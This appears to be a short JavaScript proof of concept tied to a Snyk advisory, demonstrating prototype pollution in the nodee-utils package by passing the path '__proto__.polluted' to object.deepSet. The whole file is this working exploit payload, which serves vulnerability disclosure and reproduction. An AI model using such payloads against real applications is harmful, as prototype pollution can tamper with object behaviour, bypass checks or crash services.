//https://snyk.io/vuln/SNYK-JS-NODEEUTILS-598679

 
  const { object } = require("nodee-utils");
  var obj = {};

   

  object.deepSet({}, "__proto__.polluted", "yes");
// End of file
